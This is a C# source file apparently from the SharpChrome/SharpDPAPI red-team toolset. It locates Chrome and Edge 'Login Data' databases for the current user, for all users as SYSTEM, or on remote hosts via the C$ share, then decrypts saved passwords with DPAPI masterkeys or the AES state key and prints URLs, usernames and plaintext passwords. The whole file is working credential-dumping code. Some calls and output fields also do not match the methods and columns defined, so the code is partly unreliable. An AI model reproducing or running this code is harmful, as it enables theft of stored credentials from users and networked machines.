using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using SQLite;

namespace SharpChrome
{
    internal partial class Chrome
    {
        public static void TriageAndReturnChromeLogins(Dictionary<string, string> masterKeys, string computerName = "",
            string userFolder = "",
            string displayFormat = "table", bool showAll = false, bool unprotect = false, string stateKey = "",
            string browser = "chrome", bool quiet = false)
        {
            // triage all Chromium 'Login Data' files we can reach
            List<string> userDirectories = new List<string>();

            if (!string.IsNullOrEmpty(computerName)) {
                // if we're triaging a remote computer, check connectivity first
                if (!SharpDPAPI.Helpers.TestRemote(computerName)) {
                    return;
                }

                if (!string.IsNullOrEmpty(userFolder)) {
                    // if we have a user folder as the target to triage
                    userDirectories.Add(userFolder);
                }
                else {
                    // Assume C$ (vast majority of cases)
                    string userDirectoryBase = $"\\\\{computerName}\\C$\\Users\\";
                    userDirectories.AddRange(Directory.GetDirectories(userDirectoryBase));
                }
            }
            else if (!string.IsNullOrEmpty(userFolder)) {
                // if we have a user folder as the target to triage
                userDirectories.Add(userFolder);
            }
            else if (SharpDPAPI.Helpers.IsHighIntegrity()) {
                if ($"{System.Security.Principal.WindowsIdentity.GetCurrent().User}" == "S-1-5-18") {
                    // if we're SYSTEM
                    if (masterKeys.Count > 0) {
                        if (!quiet) {
                            Console.WriteLine("\r\n[*] Triaging {0} Logins for ALL users\r\n",
                                SharpDPAPI.Helpers.Capitalize(browser));
                        }

                        userDirectories = SharpDPAPI.Helpers.GetUserFolders();
                    }
                    else {
                        if (!quiet) {
                            Console.WriteLine("\r\n[!] Running as SYSTEM but no masterkeys supplied!");
                        }

                        return;
                    }
                }
                else if (masterKeys.Count == 0) {
                    // if we're elevated but not SYSTEM, and no masterkeys are supplied, assume we're triaging just the current user
                    if (!quiet) {
                        Console.WriteLine("\r\n[*] Triaging {0} Logins for current user\r\n",
                            SharpDPAPI.Helpers.Capitalize(browser));
                    }

                    userDirectories.Add(System.Environment.GetEnvironmentVariable("USERPROFILE"));
                    unprotect = true;
                }
                else {
                    // otherwise we're elevated and have masterkeys supplied, so assume we're triaging all users
                    if (!quiet) {
                        Console.WriteLine("\r\n[*] Triaging {0} Logins for ALL users\r\n",
                            SharpDPAPI.Helpers.Capitalize(browser));
                    }

                    userDirectories = SharpDPAPI.Helpers.GetUserFolders();
                }
            }
            else {
                // not elevated, no user folder specified, so triage current user
                if (!quiet) {
                    Console.WriteLine("\r\n[*] Triaging {0} Logins for current user\r\n",
                        SharpDPAPI.Helpers.Capitalize(browser));
                }

                userDirectories.Add(System.Environment.GetEnvironmentVariable("USERPROFILE"));
                unprotect = true;
            }

            foreach (string userDirectory in userDirectories) {
                var chromeLoginDataPath =
                    $"{userDirectory}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
                var chromeAesStateKeyPath = $"{userDirectory}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";

                var edgeLoginDataPath =
                    $"{userDirectory}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data";
                var edgeAesStateKeyPath = $"{userDirectory}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State";

                byte[] chromeAesStateKey = GetStateKey(masterKeys, chromeAesStateKeyPath, unprotect, quiet);
                byte[] edgeAesStateKey = GetStateKey(masterKeys, edgeAesStateKeyPath, unprotect, quiet);

                ParseChromeLogins(masterKeys, chromeLoginDataPath, displayFormat, showAll, unprotect, chromeAesStateKey,
                    quiet);
                ParseChromeLogins(masterKeys, edgeLoginDataPath, displayFormat, showAll, unprotect, edgeAesStateKey,
                    quiet);
            }
        }
    }

    internal partial class Chrome
    {
        public static void ParseAndReturnChromeLogins(Dictionary<string, string> masterKeys, string loginDataFilePath,
            string displayFormat = "table", bool showAll = false, bool unprotect = false, byte[] aesStateKey = null,
            bool quiet = false)
        {
            // takes an individual 'Login Data' file path and performs decryption/triage on it
            if (!File.Exists(loginDataFilePath)) {
                return;
            }

            BCrypt.SafeAlgorithmHandle hAlg = null;
            BCrypt.SafeKeyHandle hKey = null;

            if (aesStateKey != null) {
                // initialize the BCrypt key using the new DPAPI decryption method
                DPAPIChromeAlgKeyFromRaw(aesStateKey, out hAlg, out hKey);
            }

            // convert to a file:/// uri path type so we can do lockless opening
            //  ref - https://github.com/gentilkiwi/mimikatz/pull/199
            var uri = new System.Uri(loginDataFilePath);
            string loginDataFilePathUri = String.Format("{0}?nolock=1", uri.AbsoluteUri);

            bool someResults = false;
            SQLiteConnection database = null;

            try {
                database = new SQLiteConnection(loginDataFilePathUri,
                    SQLiteOpenFlags.ReadOnly | SQLiteOpenFlags.OpenUri, false);
            }
            catch (Exception e) {
                Console.WriteLine("[X] {0}", e.InnerException.Message);
                return;
            }

            if (!displayFormat.Equals("table") && !displayFormat.Equals("csv")) {
                Console.WriteLine("\r\n[X] Invalid format: {0}", displayFormat);
                return;
            }

            string query =
                "SELECT signon_realm, origin_url, username_value, password_value, times_used, cast(date_created as text) as date_created FROM logins";
            List<SQLiteQueryRow> results = database.Query2(query, false);

            foreach (SQLiteQueryRow row in results) {
                byte[] passwordBytes = (byte[])row.column[3].Value;
                byte[] decBytes = null;

                // decrypt the password bytes using masterkeys or CryptUnprotectData()

                if (HasV10Header(passwordBytes)) {
                    if (aesStateKey != null) {
                        // using the new DPAPI decryption method
                        decBytes = DecryptAESChromeBlob(passwordBytes, hAlg, hKey);

                        if (decBytes == null) {
                            continue;
                        }
                    }
                    else {
                        decBytes = Encoding.ASCII.GetBytes(String.Format("--AES STATE KEY NEEDED--"));
                    }
                }
                else {
                    // using the old method
                    decBytes = SharpDPAPI.Dpapi.DescribeDPAPIBlob(passwordBytes, masterKeys, "chrome", unprotect);
                }

                string password = Encoding.ASCII.GetString(decBytes);

                DateTime dateCreated = SharpDPAPI.Helpers.ConvertToDateTime(row.column[5].Value.ToString());

                if ((password != String.Empty) || showAll) {
                    if (displayFormat.Equals("table")) {
                        if (!someResults) {
                            Console.WriteLine("\r\n--- Credential (Path: {0}) ---\r\n", loginDataFilePath);
                        }

                        someResults = true;
                        Console.WriteLine("URL       : {0} ({1})", row.column[0].Value, row.column[1].Value);
                        Console.WriteLine("Created   : {0}", dateCreated);
                        Console.WriteLine("TimesUsed : {0}", row.column[4].Value);
                        Console.WriteLine("Username  : {0}", row.column[2].Value);
                        Console.WriteLine("Password  : {0}", password);
                        Console.WriteLine();
                    }
                    else {
                        if (!someResults) {
                            if (!quiet) {
                                Console.WriteLine("\r\n---  Credential (Path: {0}) ---\r\n", loginDataFilePath);
                            }
                            else {
                                Console.WriteLine("SEP=,");
                            }

                            Console.WriteLine(
                                "file_path,signon_realm,origin_url,date_created,times_used,username,password");
                        }

                        someResults = true;

                        Console.WriteLine("{0},{1},{2},{3},{4},{5},{6}",
                            SharpDPAPI.Helpers.StringToCSVCell(loginDataFilePath),
                            SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[0].Value)),
                            SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[1].Value)),
                            SharpDPAPI.Helpers.StringToCSVCell(dateCreated.ToString()),
                            SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[5].Value)),
                            SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[2].Value)),
                            SharpDPAPI.Helpers.StringToCSVCell(password));
                    }
                }
            }

            database.Close();
        }
    }
}